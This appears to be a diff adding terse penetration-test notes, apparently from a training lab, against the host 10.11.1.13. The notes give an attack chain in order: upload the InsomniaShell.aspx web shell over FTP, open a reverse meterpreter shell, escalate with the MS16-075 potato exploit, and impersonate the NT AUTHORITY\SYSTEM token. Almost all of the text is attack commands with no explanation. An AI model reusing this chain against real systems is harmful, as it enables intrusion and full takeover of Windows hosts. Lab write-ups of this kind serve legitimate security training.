@@ -1,0 +1,27 @@
+ftp 10.11.1.13 
+
+put InsomniaShell.aspx
+
+http://10.11.1.13:4167/InsomniaShell.aspx
+
+From here I spawn a reverse meterpreter reverse shell.
+
+privesc:
+
+MS16-075
+
+spawn meterpreter 
+
+use incognito
+
+list_tokens -u
+
+upload potato.exe C:\\Users\\Public
+
+cd C:\\Users\\Public
+
+execute -cH -f ./potato.exe  ----> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075
+
+list_tokens -u
+
+impersonate_token "NT AUTHORITY\\SYSTEM"
